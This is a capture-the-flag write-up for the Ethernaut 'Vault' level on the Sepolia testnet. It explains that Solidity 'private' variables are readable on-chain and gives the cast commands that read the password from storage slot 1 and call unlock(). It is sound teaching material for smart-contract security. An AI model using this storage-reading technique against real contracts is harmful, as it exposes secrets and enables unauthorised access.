# 08 - Vault

## Overview

- **Difficulty:** 3/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0xe1a0354874905f90c0dc99d60ad321ae291fce85`](https://sepolia.etherscan.io/address/0xe1a0354874905f90c0dc99d60ad321ae291fce85)
- **Transactions:**
  - **1. Exploit (`unlock(bytes32)`):** [`0x0826da2698a3e04aef520b99c05cb8077f8c658da494cb3983f8d29f63aa1365`](https://sepolia.etherscan.io/tx/0x0826da2698a3e04aef520b99c05cb8077f8c658da494cb3983f8d29f63aa1365)
  - **2. Level Submission:** [`0x4e95fa4c561a59e25bec6f86e42d9ce14a6f63a98c8c30c21ac94e2a059e337f`](https://sepolia.etherscan.io/tx/0x4e95fa4c561a59e25bec6f86e42d9ce14a6f63a98c8c30c21ac94e2a059e337f)

---

## Objective

Unlock the `Vault` contract by flipping `locked` to `false`.

---

## Contract Analysis

The target contract is [`src/08-vault/Vault.sol`](./Vault.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

---

### Vulnerability Breakdown: The Fallacy of `private` Variables

In Solidity:
- **`private`** prevents other *smart contracts* from directly accessing or reading the state variable at compile/runtime.
- It does **NOT** provide any confidentiality or privacy from off-chain observers.

Ethereum is a completely transparent, public, and deterministic ledger. Every piece of state data is permanently stored in the contract's 32-byte storage slots on nodes worldwide. Anyone running an Ethereum client or RPC provider can read any storage slot directly using the `eth_getStorageAt` RPC endpoint.

#### Storage Layout Mapping

Solidity assigns state variables contiguously into 32-byte storage slots starting from index 0:

| Slot | Variable | Type | Size | Notes |
| :---: | :--- | :--- | :---: | :--- |
| **0** | `locked` | `bool` | 1 byte | Initialized to `true` (`0x00...01`). Padded to 32 bytes. |
| **1** | `password` | `bytes32` | 32 bytes | Marked `private`, but stored in plain hex in **Slot 1**! |

Because `bytes32` requires a full 32 bytes, it cannot be packed into Slot 0 with `locked`, so it occupies **Slot 1** in its entirety.

---

## Step-by-Step Exploit Walkthrough

No external smart contract is needed. We can inspect the on-chain storage and unlock the vault entirely through Foundry's `cast`.

### 1. Read Slot 1 Using `cast storage`

Query storage slot 1 of the `Vault` instance on Sepolia:

```bash
cast storage 0xe1a0354874905f90c0dc99d60ad321ae291fce85 1 --rpc-url sepolia
```

- **Output:**
  ```text
  0x412076657279207374726f6e67207365637265742070617373776f7264203a29
  ```

### 2. (Optional) Decode the Password

Convert the raw bytes32 hex string into readable UTF-8 text using `cast to-utf8`:

```bash
cast to-utf8 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

- **Decoded String:**
  ```text
  A very strong secret password :)
  ```

### 3. Unlock the Vault

Call `unlock(bytes32)` passing the retrieved password bytes:

```bash
cast send 0xe1a0354874905f90c0dc99d60ad321ae291fce85 \
  "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 \
  --rpc-url sepolia \
  --account <YOUR_ACCOUNT>
```

- **Tx Hash:** [`0x0826da2698a3e04aef520b99c05cb8077f8c658da494cb3983f8d29f63aa1365`](https://sepolia.etherscan.io/tx/0x0826da2698a3e04aef520b99c05cb8077f8c658da494cb3983f8d29f63aa1365)

### 4. Verify Unlock State

Check `locked` (or query slot 0):

```bash
cast call 0xe1a0354874905f90c0dc99d60ad321ae291fce85 "locked()(bool)" --rpc-url sepolia
# Output: false
```

Slot 0 now returns `0x0000000000000000000000000000000000000000000000000000000000000000`. The vault is unlocked!

### 5. Submit Level

Submit the challenge instance on Ethernaut:

- **Submission Tx:** [`0x4e95fa4c561a59e25bec6f86e42d9ce14a6f63a98c8c30c21ac94e2a059e337f`](https://sepolia.etherscan.io/tx/0x4e95fa4c561a59e25bec6f86e42d9ce14a6f63a98c8c30c21ac94e2a059e337f)

---

## Key Security Takeaways

1. **Nothing is Secret On-Chain:**
   Never store private keys, passwords, sensitive personal data, or unencrypted secrets on the blockchain. Any variable, regardless of whether it is declared `private` or `internal`, is readable by anyone via `eth_getStorageAt`.
2. **Commit-Reveal Schemes:**
   When an application requires hidden choices (e.g. sealed-bid auctions, secret voting, or multiplayer games), use a **commit-reveal** scheme:
   - Phase 1 (Commit): Users submit a hash of their choice concatenated with a secret salt: `keccak256(abi.encodePacked(choice, salt))`.
   - Phase 2 (Reveal): Users reveal their `choice` and `salt`, and the contract verifies the hash matches the commitment.
3. **Zero-Knowledge Proofs (ZKPs):**
   For verification without revealing underlying sensitive inputs, leverage ZKPs (e.g., zk-SNARKs) to prove validity off-chain and verify on-chain.
